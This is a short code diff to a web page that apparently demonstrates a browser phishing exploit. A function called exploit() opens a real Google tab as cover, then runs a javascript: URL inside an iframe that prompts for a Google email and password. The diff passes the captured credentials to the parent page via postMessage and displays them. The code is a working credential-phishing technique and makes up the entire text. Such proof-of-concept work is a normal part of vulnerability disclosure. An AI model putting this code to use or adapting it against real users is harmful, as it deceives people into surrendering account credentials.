@@ -7,15 +7,20 @@
         // New tab open to make user feel like something real is happening
         window.open("https://www.google.com");
 
-        // Prompt runs via javascript: URL inside an iframe (works in vulnerable browsers)
+        // Run prompt inside iframe and send result to parent
         document.getElementById("phishFrame").src =
           'javascript:var userInput = prompt("To continue to Google\\nPlease login with your email and password:", "Email / Password");\
            if (userInput) {\
-             var outputDiv = document.createElement("div");\
-             outputDiv.textContent = `Entered Credentials: ${userInput}`;\
-             document.body.appendChild(outputDiv);\
+             parent.postMessage(userInput, "*");\
            }';
       }
+
+      // Listen for data from iframe
+      window.addEventListener("message", function(event) {
+        const outputDiv = document.createElement("div");
+        outputDiv.textContent = `Entered Credentials: ${event.data}`;
+        document.body.appendChild(outputDiv);
+      });
     </script>
 
     <a href="#" onclick="exploit();">
